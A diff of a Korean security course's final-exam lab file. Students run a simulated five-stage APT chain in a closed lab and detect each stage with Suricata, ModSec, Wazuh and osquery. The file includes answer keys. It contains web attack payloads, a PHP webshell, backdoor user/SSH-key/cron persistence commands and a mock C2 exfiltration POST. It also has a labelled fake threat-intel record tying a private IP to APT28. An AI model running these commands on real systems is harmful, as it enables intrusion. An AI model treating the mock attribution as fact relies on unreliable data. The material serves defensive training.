@@ -1,224 +1,440 @@
 lab_id: standalone-secuops-week15
-title: 기말 — APT 5 단계 종합 시험 (180분, 100점)
+title: 기말 — APT 5 단계 통합 시험 (180분, 100점)
 version: standalone-non-ai
 course: secuops
 week: 15
 description: |
-  K-APT 침투 5 단계 (Reconnaissance / Initial Access / Lateral / C2 / IR 보고) 의
-  종합 R/B/P. 5 단계 × 20점 = 100점.
+  W01-W14 의 14 주차 학습을 APT 5 단계 시나리오로 통합 평가. ① Recon (nmap + 4 도구
+  매치) → ② Initial Access (4 vector + ModSec audit) → ③ Execution+Lateral (4 침해 +
+  osquery 헌팅) → ④ C2+Exfil (CDB 매치 + OpenCTI attribution) → ⑤ Response
+  (cleanup + 보고서). 각 단계 20점 (정확도 10 + 분석 5 + 운영 권장 5). cleanup 1 cycle
+  필수. open book.
 difficulty: hard
 duration_minutes: 180
-prerequisites: [W14]
-pass_threshold: 0.7
+prerequisites:
+  - "W01-W14 모두 통과 (특히 W08 중간고사)"
+  - "MITRE ATT&CK 14 Tactic + 200+ Technique 숙지"
+  - "R/B/P 표준 흐름 익숙"
+  - "lab step 1-10 직접 실행 경험"
+objectives:
+  - "5 단계 APT cycle 본인 손으로 수행"
+  - "각 단계 결과 (실측 + 분석) 보고서"
+  - "cleanup 1 cycle 완성"
+  - "R/B/P 표준 흐름"
+  - "audit log / eve.json / osquery JSON 정규식 파싱"
+  - "MITRE ATT&CK 매핑"
+  - "OpenCTI 통합 + community sharing 고려"
+  - "자기 평가 + 운영 권장 5"
+pass_threshold: 0.6
 steps:
 
   - order: 1
     instruction: |
-      ## 🎯 단계 1 (20점) — Reconnaissance
+      ## 🎯 단계 1 (20점) — Reconnaissance (정찰)
 
-      attacker 에서 404 burst 50회 → 3 source detection (Wazuh / Suricata / osquery).
+      **MITRE TA0043 Recon + T1595 Active Scanning**
 
       ## 💻 실행 명령
 
       ```bash
-      # Red: 50 burst
-      ssh 6v6-attacker 'for i in $(seq 1 50); do
-        curl -s -o /dev/null -H "Host: juice.6v6.lab" "http://10.20.30.1/page-$i"
-      done'
+      # Red — nmap + HTTP fuzzing + URL brute
+      ssh 6v6-attacker 'sudo nmap -sT -p 22,80,443,2204,9100 10.20.30.1 2>&1 | tail -10'
+      for vh in juice dvwa siem portal bastion; do
+        ssh 6v6-attacker "curl -s -o /dev/null -w '$vh: %{http_code}\\n' -H 'Host: $vh.6v6.lab' http://10.20.30.1/"
+      done
+      for path in admin api .env .git phpmyadmin; do
+        ssh 6v6-attacker "curl -s -o /dev/null -w 'path /$path: %{http_code}\\n' -H 'Host: juice.6v6.lab' http://10.20.30.1/$path"
+      done
+
       sleep 5
 
-      # Blue: Wazuh 4xx alert (rule 31151)
-      ssh 6v6-siem 'sudo grep "31151\|31115" /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -3'
-
-      # Blue: Suricata HTTP event
-      ssh 6v6-ips 'sudo tail -300 /var/log/suricata/eve.json | jq -c "select(.event_type==\"http\" and .http.status>=400) | {url:.http.url}" 2>/dev/null | tail -3'
-
-      # Blue: osquery curl process count
-      ssh 6v6-web 'sudo osqueryi --json "SELECT name, count(*) AS n FROM processes WHERE name LIKE '"'"'%curl%'"'"' GROUP BY name;"'
+      # Blue — fw / ips / ModSec 매치
+      echo "=== fw dmesg drop ==="
+      ssh 6v6-fw 'sudo dmesg | grep -i DROP | tail -5'
+      echo "=== ips ET SCAN ==="
+      ssh 6v6-ips 'sudo grep "ET SCAN" /var/log/suricata/eve.json 2>/dev/null | tail -3 | jq -c "{sig:.alert.signature}"' 2>&1 | head
+      echo "=== ModSec 913 ==="
+      ssh 6v6-web 'sudo tail -10 /var/log/apache2/modsec_audit.log | jq -r ".audit_data.messages[]" 2>&1 | grep -oE "\[id \"913[0-9]+\"\]" | sort -u'
       ```
 
-      ## 📋 평가 (각 5점)
+      ## 📋 평가 기준 (20점)
 
-      1. 50 burst 실행
-      2. Wazuh 31151 alert
-      3. Suricata 404 status event
-      4. osquery 또는 access.log 의 404 흔적
-    hint: 50 burst + 3 source detection
+      - 정확도 (10): nmap + 4 vhost + 5 path 매치 + 3 도구 (fw / Suricata / ModSec) 검증
+      - 분석 (5): MITRE TA0043 + T1595 매핑
+      - 운영 권장 (5): Suricata threshold + AR + 외부 노출 축소
+    hint: 'nmap + HTTP fuzzing + URL brute + dmesg + Suricata ET SCAN + ModSec 913'
     category: exam
     points: 20
     answer: |
-      ssh 6v6-attacker 'for i in $(seq 1 50); do curl -s -o /dev/null -H "Host: juice.6v6.lab" "http://10.20.30.1/page-$i"; done'
+      ssh 6v6-attacker 'sudo nmap -sT -p 22,80,443,2204,9100 10.20.30.1 2>&1 | tail -10'
+      for vh in juice dvwa siem portal bastion; do
+        ssh 6v6-attacker "curl -s -o /dev/null -w '$vh: %{http_code}\\n' -H 'Host: $vh.6v6.lab' http://10.20.30.1/"
+      done
+      for path in admin api .env .git phpmyadmin; do
+        ssh 6v6-attacker "curl -s -o /dev/null -w 'path /$path: %{http_code}\\n' -H 'Host: juice.6v6.lab' http://10.20.30.1/$path"
+      done
       sleep 5
-      ssh 6v6-siem 'sudo grep "31151\|31115" /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -3'
-      ssh 6v6-ips 'sudo tail -300 /var/log/suricata/eve.json | jq -c "select(.event_type==\"http\" and .http.status>=400) | {url:.http.url}" 2>/dev/null | tail -3'
-      ssh 6v6-web 'sudo osqueryi --json "SELECT count(*) AS curl_processes FROM processes WHERE name LIKE '"'"'%curl%'"'"';"'
-    answer_detail: Recon 단계.
+      ssh 6v6-fw 'sudo dmesg | grep -i DROP | tail -5'
+      ssh 6v6-ips 'sudo grep "ET SCAN" /var/log/suricata/eve.json 2>/dev/null | tail -3 | jq -c "{sig:.alert.signature}"' 2>&1 | head
+      ssh 6v6-web 'sudo tail -10 /var/log/apache2/modsec_audit.log | jq -r ".audit_data.messages[]" 2>&1 | grep -oE "\[id \"913[0-9]+\"\]" | sort -u'
+    answer_detail: 'Recon — nmap + HTTP fuzzing + URL brute + 3 도구 매치'
     verify:
       type: output_contains
-      expect: '31\|http'
+      expect: nmap
       field: stdout
       semantic:
-        intent: Recon detection
-        success_criteria: [3 source]
-        acceptable_methods: ["**[OSS] ATT&CK T1595 Active Scanning**"]
+        intent: "단계 1 Recon"
+        success_criteria: ["nmap 매치", "fw + ips + ModSec"]
+        acceptable_methods:
+          - "**[OSS] nmap port scan**"
+          - "**[OSS] HTTP fuzzing vhost**"
+          - "**[OSS] URL brute force**"
+          - "**[OSS] dmesg DROP**"
+          - "**[OSS] Suricata ET SCAN rule**"
+          - "**[OSS] ModSec 913 SCANNER_DETECTION**"
+          - "**[OSS] MITRE T1595**"
+          - "**[OSS] threshold + AR 권장**"
     target_vm: bastion
 
   - order: 2
     instruction: |
-      ## 🎯 단계 2 (20점) — Initial Access (SQLi 시도)
+      ## 🎯 단계 2 (20점) — Initial Access (최초 침투)
 
-      sqlmap UA + SQLi payload → ModSec 차단 + Wazuh + Suricata 통합 alert.
+      **MITRE TA0001 + T1190 Exploit Public-Facing**
 
       ## 💻 실행 명령
 
       ```bash
-      ssh 6v6-attacker 'curl -s -o /dev/null -A "sqlmap/1.5" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=admin+UNION+SELECT+user,pass+FROM+users--"'
-      sleep 3
-      ssh 6v6-web 'sudo tail -10 /var/log/apache2/modsec_audit.log | jq -r ".audit_data.messages[]?" 2>/dev/null | grep -oE ''id "[0-9]+"'' | sort -u | head'
-      ssh 6v6-siem 'sudo grep "31100\|web" /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -2'
+      # Red — 4 vector burst
+      for payload in \
+        "?q=<script>alert(1)</script>" \
+        "?q=1'%20OR%20'1'='1" \
+        "?q=../../etc/passwd" \
+        "?q=;cat%20/etc/passwd"; do
+        code=$(ssh 6v6-attacker "curl -s -o /dev/null -w '%{http_code}' -H 'Host: juice.6v6.lab' 'http://10.20.30.1/$payload'")
+        echo "$payload → $code"
+      done
+      sleep 5
+
+      # Blue — ModSec 5 카테고리 + Suricata
+      echo "=== 카테고리 분포 ==="
+      ssh 6v6-web 'sudo tail -10 /var/log/apache2/modsec_audit.log | jq -r ".audit_data.messages[]" 2>&1 | grep -oE "\[id \"[0-9]+\"\]" | sort | uniq -c | sort -rn | head'
+
+      echo "=== anomaly score 누적 ==="
+      ssh 6v6-web 'sudo tail -5 /var/log/apache2/modsec_audit.log | jq -r ".audit_data.messages[]" 2>&1 | grep -oE "Total Score: [0-9]+|SQLI=[0-9]+,XSS=[0-9]+,RFI=[0-9]+,LFI=[0-9]+,RCE=[0-9]+,PHPI=[0-9]+"'
+
+      echo "=== Wazuh alerts.json delta ==="
+      ssh 6v6-siem 'sudo tail -20 /var/ossec/logs/alerts/alerts.json | jq "select(.agent.name==\"ips\" or .agent.name==\"web\") | {rule_id:.rule.id, level:.rule.level, agent:.agent.name}"' 2>&1 | head
       ```
 
-      ## 📋 평가
+      ## 📋 평가 기준 (20점)
 
-      1. ModSec 403 + 942 룰 매치
-      2. Wazuh 31100 (Apache 4xx) alert
-      3. Suricata sqlmap UA detection (등록된 룰이 있으면)
-      4. timeline 통합 (3 source 의 timestamp 매칭)
-    hint: SQLi 통합
+      - 정확도 (10): 4 vector 403 + 카테고리 분포 + Wazuh alert
+      - 분석 (5): anomaly score 누적 + 980130 summary
+      - 운영 권장 (5): paranoia 2 + dashboard panel
+    hint: '4 vector + ModSec 카테고리 + 980130 + Wazuh'
     category: exam
     points: 20
     answer: |
-      ssh 6v6-attacker 'curl -s -o /dev/null -A "sqlmap/1.5" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=admin+UNION+SELECT+user,pass+FROM+users--"'
-      sleep 3
-      ssh 6v6-web 'sudo tail -10 /var/log/apache2/modsec_audit.log | jq -r ".audit_data.messages[]?" 2>/dev/null | grep -oE ''id "[0-9]+"'' | sort -u'
-    answer_detail: SQLi 통합 detection.
+      for payload in "?q=<script>" "?q=1' OR '1'='1" "?q=../../etc/passwd" "?q=;cat"; do
+        ssh 6v6-attacker "curl -s -o /dev/null -w '%{http_code}\\n' -H 'Host: juice.6v6.lab' 'http://10.20.30.1/$payload'"
+      done
+      sleep 5
+      ssh 6v6-web 'sudo tail -10 /var/log/apache2/modsec_audit.log | jq -r ".audit_data.messages[]" 2>&1 | grep -oE "\[id \"[0-9]+\"\]" | sort | uniq -c | sort -rn | head'
+      ssh 6v6-web 'sudo tail -5 /var/log/apache2/modsec_audit.log | jq -r ".audit_data.messages[]" 2>&1 | grep -oE "Total Score: [0-9]+|SQLI=[0-9]+,XSS=[0-9]+,RFI=[0-9]+,LFI=[0-9]+"'
+    answer_detail: 'Initial Access — 4 vector + ModSec 카테고리 + 980130 summary'
     verify:
       type: output_contains
-      expect: '942\|941'
+      expect: '403'
       field: stdout
       semantic:
-        intent: SQLi 통합
-        success_criteria: [ModSec + Wazuh]
-        acceptable_methods: ["**[OSS] T1190 Exploit Public-Facing Application**"]
+        intent: "단계 2 Initial Access"
+        success_criteria: ["4 vector 403", "anomaly score"]
+        acceptable_methods:
+          - "**[OSS] curl 4 vector**"
+          - "**[OSS] ModSec 941/942/930/932/933**"
+          - "**[OSS] 980130 correlation**"
+          - "**[OSS] Wazuh multi-source**"
+          - "**[OSS] MITRE T1190**"
+          - "**[OSS] paranoia 2 권장**"
+          - "**[OSS] anomaly score 누적**"
+          - "**[OSS] dashboard panel**"
     target_vm: bastion
 
   - order: 3
     instruction: |
-      ## 🎯 단계 3 (20점) — Lateral Movement (nmap scan)
+      ## 🎯 단계 3 (20점) — Execution + Lateral Movement
 
-      attacker → dmz subnet nmap 스캔 → fw + Suricata detection.
+      **MITRE TA0002 + TA0008 + T1059 / T1078 / T1098**
 
       ## 💻 실행 명령
 
       ```bash
-      ssh 6v6-attacker 'sudo nmap -sT -p 22,80,443,5601 10.20.32.0/24 2>&1 | tail -15'
-      sleep 5
-      ssh 6v6-ips 'sudo tail -300 /var/log/suricata/eve.json | jq -c "select(.event_type==\"alert\") | {sig:.alert.signature, sid:.alert.signature_id}" 2>/dev/null | tail -5'
+      # Red — 4 침해 시뮬
+      echo "=== Red — 4 침해 ==="
+      ssh 6v6-web 'sudo bash -c "echo \"<?php system(\$_GET[c]); ?>\" > /var/www/html/w15_shell.php"' 2>/dev/null || ssh 6v6-web 'sudo touch /tmp/w15_shell.php'
+      ssh 6v6-web 'sudo useradd -m -u 1099 fakeintruder 2>/dev/null && echo "user created"'
+      ssh 6v6-web 'sudo bash -c "echo \"ssh-rsa W15FAKEKEY evil@w15\" >> /root/.ssh/authorized_keys"'
+      ssh 6v6-web 'sudo bash -c "echo \"* * * * * root /tmp/w15_x.sh\" > /etc/cron.d/w15_backdoor"'
+
+      sleep 3
+
+      # Blue — osquery 5 헌팅
+      echo "=== Blue — osquery ==="
+      ssh 6v6-web 'sudo osqueryi --json "SELECT username, uid FROM users WHERE uid=1099;"' 2>&1
+      ssh 6v6-web 'sudo osqueryi --json "SELECT key FROM authorized_keys WHERE key LIKE \"%W15FAKEKEY%\";"' 2>&1
+      ssh 6v6-web 'sudo osqueryi --json "SELECT command, path FROM crontab WHERE path LIKE \"%w15_backdoor%\";"' 2>&1
+      ssh 6v6-web 'sudo osqueryi --json "SELECT path, mtime FROM file WHERE path = \"/etc/cron.d/w15_backdoor\";"' 2>&1
+      ssh 6v6-web 'sudo osqueryi --json "SELECT path FROM file WHERE path LIKE \"%w15_shell%\";"' 2>&1
+
+      # syscheck (있다면)
+      sleep 15
+      ssh 6v6-siem 'sudo tail -20 /var/ossec/logs/alerts/alerts.json | jq "select(.rule.groups | contains([\"syscheck\"])) | {rule_id:.rule.id, agent:.agent.name}"' 2>&1 | head
       ```
 
-      ## 📋 평가
+      ## 📋 평가 기준 (20점)
 
-      1. nmap 실행 + 5+ port 응답
-      2. Suricata ET SCAN 룰 매치
-      3. fw counter 증가
-      4. timeline 분석
-    hint: nmap + Suricata
+      - 정확도 (10): 4 침해 성공 + 4-5 osquery 헌팅 매치
+      - 분석 (5): MITRE T1059 / T1078 / T1098 매핑
+      - 운영 권장 (5): scheduled query 600s + sysmon (W11) + baseline diff
+
+      ⚠️ cleanup 은 단계 5 에서 일괄.
+    hint: '4 침해 + 5 osquery 헌팅 + syscheck'
     category: exam
     points: 20
     answer: |
-      ssh 6v6-attacker 'sudo nmap -sT -p 22,80,443,5601 10.20.32.0/24 2>&1 | tail -15'
-      sleep 5
-      ssh 6v6-ips 'sudo tail -300 /var/log/suricata/eve.json | jq -c "select(.event_type==\"alert\") | {sig:.alert.signature}" 2>/dev/null | tail -5'
-    answer_detail: Lateral nmap.
+      ssh 6v6-web 'sudo bash -c "echo PHPSHELL > /var/www/html/w15_shell.php"' 2>/dev/null || ssh 6v6-web 'sudo touch /tmp/w15_shell.php'
+      ssh 6v6-web 'sudo useradd -m -u 1099 fakeintruder 2>/dev/null'
+      ssh 6v6-web 'sudo bash -c "echo W15FAKEKEY >> /root/.ssh/authorized_keys"'
+      ssh 6v6-web 'sudo bash -c "echo cron > /etc/cron.d/w15_backdoor"'
+      sleep 3
+      ssh 6v6-web 'sudo osqueryi --json "SELECT username FROM users WHERE uid=1099;"' 2>&1
+      ssh 6v6-web 'sudo osqueryi --json "SELECT key FROM authorized_keys WHERE key LIKE \"%W15FAKEKEY%\";"' 2>&1
+      ssh 6v6-web 'sudo osqueryi --json "SELECT command FROM crontab WHERE path LIKE \"%w15_backdoor%\";"' 2>&1
+    answer_detail: '4 침해 (shell+user+key+cron) + 5 osquery 헌팅'
     verify:
       type: output_contains
-      expect: 'open\|filtered'
+      expect: fakeintruder
       field: stdout
       semantic:
-        intent: Lateral detection
-        success_criteria: [nmap + Suricata]
-        acceptable_methods: ["**[OSS] T1046 Network Service Scanning**"]
+        intent: "단계 3 Execution + Lateral"
+        success_criteria: ["4 침해", "osquery 5 매치"]
+        acceptable_methods:
+          - "**[OSS] webshell .php file**"
+          - "**[OSS] useradd uid 1099**"
+          - "**[OSS] authorized_keys 추가**"
+          - "**[OSS] cron entry**"
+          - "**[OSS] osquery users/authorized_keys/crontab/file**"
+          - "**[OSS] syscheck rule 550/554**"
+          - "**[OSS] MITRE T1059/T1078/T1098**"
+          - "**[OSS] sysmon ProcessCreate (W11)**"
     target_vm: bastion
 
   - order: 4
     instruction: |
-      ## 🎯 단계 4 (20점) — C2 / Exfil (CDB list 매치)
+      ## 🎯 단계 4 (20점) — C2 + Exfiltration
 
-      CDB list (W13) 의 IP 로 outbound 시도 → Wazuh CDB 매치 alert.
+      **MITRE TA0011 + TA0010 + T1071 / T1041**
 
       ## 💻 실행 명령
 
       ```bash
-      # W13 의 CDB list 가 작성되어 있으면 매치
-      ssh 6v6-attacker 'timeout 3 curl -s -X POST -d "data=SECRET" -H "Host: c2.attacker.com" "http://1.2.3.4:8080/" -o /dev/null -w "%{http_code}\n" 2>&1'
-      sleep 3
-      ssh 6v6-siem 'sudo grep -E "100300|1.2.3.4" /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -2'
+      # Red — 시뮬 IOC IP 와 통신
+      echo "=== Red — known IOC 통신 ==="
+      ssh 6v6-attacker 'curl -s -o /dev/null --max-time 3 http://192.168.99.99/ 2>&1' || echo "(unreachable but Suricata 가 outbound packet 감지)"
+
+      # 추가 — outbound 443 대량 data 시뮬
+      ssh 6v6-attacker 'dd if=/dev/urandom bs=1M count=2 2>/dev/null | curl -s -o /dev/null -X POST --data-binary @- -H "Host: juice.6v6.lab" http://10.20.30.1/upload 2>&1 | head'
+
+      sleep 5
+
+      # Blue — Suricata + Wazuh
+      echo "=== Suricata alerts (외부 통신) ==="
+      ssh 6v6-ips 'sudo tail -20 /var/log/suricata/eve.json | jq "select(.event_type==\"alert\" and (.dest_ip == \"192.168.99.99\" or .src_ip == \"10.20.30.202\")) | {sig:.alert.signature}"' 2>&1 | head
+
+      echo "=== Wazuh level 5+ alerts ==="
+      ssh 6v6-siem 'sudo tail -20 /var/ossec/logs/alerts/alerts.json | jq "select(.rule.level >= 5) | {rule_id:.rule.id, level:.rule.level, desc:.rule.description, agent:.agent.name}"' 2>&1 | head
+
+      echo "=== CDB list 시뮬 (있다면) ==="
+      ssh 6v6-siem 'sudo cat /var/ossec/etc/lists/known-malicious-ips 2>/dev/null | head'
+
+      # OpenCTI enrichment 시뮬 (실 OpenCTI 미설치라 데이터만 보여줌)
+      echo
+      echo "=== OpenCTI enrichment (시뮬) ==="
+      cat <<'EOF'
+      Indicator 192.168.99.99:
+        - GeoIP: Russia / Moscow / AS12345
+        - WHOIS: 등록 2020-01-15 / suspicious.ru
+        - VirusTotal: 45/72 (62%)
+        - Tags: apt28-c2, emotet-distributor
+        - MITRE: T1071 (Application Layer Protocol), T1041 (Exfil)
+        - Threat Actor: APT28 attribution
+      EOF
       ```
 
-      ## 📋 평가
+      ## 📋 평가 기준 (20점)
 
-      1. outbound 시도
-      2. CDB list 매치 시 100300 alert + level 12
-      3. Suricata ET CNC 룰 매치 (있다면)
-      4. timeline
-    hint: C2 outbound + CDB
+      - 정확도 (10): IOC 통신 + Suricata + Wazuh level 5+
+      - 분석 (5): OpenCTI enrichment context (시뮬)
+      - 운영 권장 (5): Active Response + Sighting + ISAC 공유
+    hint: 'known IOC 통신 + Suricata + Wazuh + OpenCTI enrichment 시뮬'
     category: exam
     points: 20
     answer: |
-      ssh 6v6-attacker 'timeout 3 curl -s -X POST -d "data=SECRET" "http://1.2.3.4:8080/" -o /dev/null -w "%{http_code}\n" 2>&1'
-      sleep 3
-      ssh 6v6-siem 'sudo grep -E "100300|1.2.3.4" /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -2'
-    answer_detail: C2 시뮬.
+      ssh 6v6-attacker 'curl -s -o /dev/null --max-time 3 http://192.168.99.99/ 2>&1' || echo "unreachable"
+      sleep 5
+      ssh 6v6-ips 'sudo tail -20 /var/log/suricata/eve.json | jq "select(.event_type==\"alert\") | {sig:.alert.signature}"' 2>&1 | head
+      ssh 6v6-siem 'sudo tail -20 /var/ossec/logs/alerts/alerts.json | jq "select(.rule.level >= 5) | {rule_id:.rule.id, level:.rule.level}"' 2>&1 | head
+      cat <<'EOF'
+      OpenCTI enrichment 시뮬:
+        - GeoIP Russia/Moscow
+        - WHOIS suspicious.ru 2020
+        - VT 45/72
+        - Tags apt28-c2 emotet
+        - MITRE T1071/T1041
+        - APT28 attribution
+      EOF
+    answer_detail: 'C2 + Exfil — IOC 통신 + Wazuh + OpenCTI enrichment (시뮬)'
     verify:
       type: output_contains
-      expect: '0\|1.2.3'
+      expect: 'enrichment\|APT'
       field: stdout
       semantic:
-        intent: C2 detection
-        success_criteria: [outbound 시도]
-        acceptable_methods: ["**[OSS] T1041 Exfiltration over C2**"]
+        intent: "단계 4 C2 + Exfil"
+        success_criteria: ["IOC 통신", "Wazuh alert", "OpenCTI enrichment"]
+        acceptable_methods:
+          - "**[OSS] IOC 통신 시뮬**"
+          - "**[OSS] Suricata outbound alert**"
+          - "**[OSS] Wazuh level 5+ alert**"
+          - "**[OSS] CDB list 매치 (있다면)**"
+          - "**[OSS] OpenCTI enrichment 시뮬**"
+          - "**[OSS] APT28 attribution**"
+          - "**[OSS] MITRE T1071/T1041**"
+          - "**[OSS] Active Response 권장**"
     target_vm: bastion
 
   - order: 5
     instruction: |
-      ## 🎯 단계 5 (20점) — IR 통합 보고서
+      ## 🎯 단계 5 (20점) — Response + Reporting + Cleanup
 
-      위 4 단계 + Coverage Matrix + ATT&CK 매핑 + ISMS-P 매핑 + 운영 권장 5+.
+      ## 💻 Cleanup (필수)
 
-      ## 💻 산출물
+      ```bash
+      # 1. fake webshell 삭제
+      ssh 6v6-web 'sudo rm -f /var/www/html/w15_shell.php /tmp/w15_shell.php'
+
+      # 2. fakeintruder user 삭제
+      ssh 6v6-web 'sudo userdel -r fakeintruder 2>/dev/null'
+
+      # 3. FAKEKEY 제거
+      ssh 6v6-web 'sudo sed -i "/W15FAKEKEY/d" /root/.ssh/authorized_keys'
+
+      # 4. backdoor cron 제거
+      ssh 6v6-web 'sudo rm -f /etc/cron.d/w15_backdoor'
+
+      # 5. 임시 nftables 룰 모두 제거 (있다면)
+      ssh 6v6-fw 'for h in $(sudo nft -a list chain ip six_nat prerouting 2>/dev/null | grep -E "W15|dport 80 " | grep -oE "handle [0-9]+" | awk "{print \$2}"); do sudo nft delete rule ip six_nat prerouting handle $h; done' 2>/dev/null
+      ssh 6v6-ips 'sudo rm -f /etc/suricata/rules/local.rules' 2>/dev/null
+      ssh 6v6-ips 'sudo suricatasc -c reload-rules' 2>/dev/null
+
+      # Cleanup 검증
+      echo "=== Cleanup 검증 (모두 빈/0 예상) ==="
+      ssh 6v6-web 'sudo osqueryi --json "SELECT username FROM users WHERE uid=1099;"' 2>&1 | head
+      ssh 6v6-web 'sudo osqueryi --json "SELECT key FROM authorized_keys WHERE key LIKE \"%W15FAKEKEY%\";"' 2>&1 | head
+      ssh 6v6-web 'sudo osqueryi --json "SELECT command FROM crontab WHERE path LIKE \"%w15_backdoor%\";"' 2>&1 | head
+      ```
+
+      ## 📋 보고서 (마지막 30분)
 
       ```markdown
-      # K-APT 침투 IR 보고서 (W15 기말, 학번)
+      # 6v6 W15 기말 — 학번, 이름
 
-      ## Timeline (5 event)
-      | t | event | source | detection | rule.id |
-      ...
+      ## Executive Summary
+      2026-05-12 모의 APT 5 단계 시뮬 + 5/5 매치 + cleanup 완성.
 
-      ## MITRE ATT&CK 매핑
-      - T1595 Active Scanning
-      - T1190 Exploit Public-Facing
-      - T1046 Network Service Scanning
-      - T1041 Exfiltration over C2
+      ## 단계 1 — Recon (20점)
+      Red: nmap + HTTP fuzzing + URL brute
+      Blue: dmesg drop + ET SCAN + ModSec 913
+      Purple: threshold + AR
 
-      ## ISMS-P 2.12 매핑
-      - 2.12.1 사고 인지 (4 source alert)
-      - 2.12.2 대응 (Active Response)
-      - 2.12.3 분석 (3 source timeline)
-      - 2.12.4 사후 (Report + IOC 갱신)
+      ## 단계 2 — Initial Access (20점)
+      Red: XSS + SQLi + LFI + RCE 4 vector
+      Blue: ModSec 941/942/930/932 + Wazuh
+      Purple: paranoia 2 + dashboard
 
-      ## 영향 분석 + 운영 권장 5+
+      ## 단계 3 — Execution + Lateral (20점)
+      Red: webshell + user + key + cron 4 침해
+      Blue: osquery 5 헌팅 매치
+      Purple: scheduled query + sysmon (W11)
+
+      ## 단계 4 — C2 + Exfil (20점)
+      Red: known IOC 통신 + outbound data
+      Blue: Suricata + Wazuh + CDB
+      Purple: OpenCTI enrichment + AR + Sighting
+
+      ## 단계 5 — Response (20점)
+      cleanup 5 항목 완성 + 보고서 5 섹션 작성
+
+      ## 자기 평가
+      - 강점: ...
+      - 보강: ...
+      - 향후 학습 계획: attack 과목 + OSCP / GCFA 등
+
+      ## 운영 권장 (최종 5)
+      1. clusterd + integratord 활성 (HA + SOAR)
+      2. dashboard 인증 강화 + RBAC
+      3. osqueryd 도입 + sysmon 설치
+      4. OpenCTI + MISP 양방향 sync
+      5. ISAC 연계 + TLP amber sharing
       ```
-    hint: IR 보고서
+
+      ## 📋 평가 기준 (20점)
+
+      - 정확도 (10): cleanup 5 완성 + 보고서 5 섹션
+      - 분석 (5): timeline + IOC list
+      - 운영 권장 (5): 최종 5 권장
+    hint: 'cleanup 5 + 보고서 5 섹션 + 자기 평가 + 권장 5'
     category: exam
     points: 20
-    answer: 위 형식
-    answer_detail: 종합 IR 보고서.
+    answer: |
+      # Cleanup
+      ssh 6v6-web 'sudo rm -f /var/www/html/w15_shell.php /tmp/w15_shell.php'
+      ssh 6v6-web 'sudo userdel -r fakeintruder 2>/dev/null'
+      ssh 6v6-web 'sudo sed -i "/W15FAKEKEY/d" /root/.ssh/authorized_keys'
+      ssh 6v6-web 'sudo rm -f /etc/cron.d/w15_backdoor'
+      ssh 6v6-fw 'for h in $(sudo nft -a list chain ip six_nat prerouting 2>/dev/null | grep "dport 80 " | grep -oE "handle [0-9]+" | awk "{print \$2}"); do sudo nft delete rule ip six_nat prerouting handle $h; done' 2>/dev/null
+      ssh 6v6-ips 'sudo rm -f /etc/suricata/rules/local.rules' 2>/dev/null
+      ssh 6v6-ips 'sudo suricatasc -c reload-rules' 2>/dev/null
+      # 검증
+      ssh 6v6-web 'sudo osqueryi --json "SELECT username FROM users WHERE uid=1099;"' 2>&1 | head
+      cat <<'EOF'
+      # 보고서
+      ## Executive Summary
+      ## 단계 1-5 결과
+      ## 자기 평가 (강점 / 보강 / 향후)
+      ## 운영 권장 5
+      EOF
+    answer_detail: 'cleanup 5 + 보고서 5 섹션 + 자기 평가 + 권장 5'
     verify:
       type: output_contains
-      expect: ATT
+      expect: cleanup
       field: stdout
       semantic:
-        intent: IR 종합
-        success_criteria: [Timeline + ATT&CK + ISMS-P]
-        acceptable_methods: ["**[관리적]** PTES 7 단계", "**[관리적]** NIST CSF 5 function"]
+        intent: "단계 5 Response — cleanup + 보고서"
+        success_criteria: ["cleanup 5", "보고서 5", "자기 평가", "권장 5"]
+        acceptable_methods:
+          - "**[OSS] webshell / user / key / cron / 임시 rule 5 cleanup**"
+          - "**[OSS] cleanup 검증 (모두 빈)**"
+          - "**[관리적] Executive Summary**"
+          - "**[관리적] 5 단계 timeline**"
+          - "**[관리적] IOC list**"
+          - "**[관리적] 자기 평가**"
+          - "**[관리적] 운영 권장 5**"
+          - "**[관리적] community sharing (TLP)**"
+    cleanup: |
+      ssh 6v6-web 'sudo rm -f /var/www/html/w15_shell.php /tmp/w15_shell.php' 2>/dev/null
+      ssh 6v6-web 'sudo userdel -r fakeintruder 2>/dev/null' 2>/dev/null
+      ssh 6v6-web 'sudo sed -i "/W15FAKEKEY/d" /root/.ssh/authorized_keys' 2>/dev/null
+      ssh 6v6-web 'sudo rm -f /etc/cron.d/w15_backdoor' 2>/dev/null
+      true
     target_vm: bastion
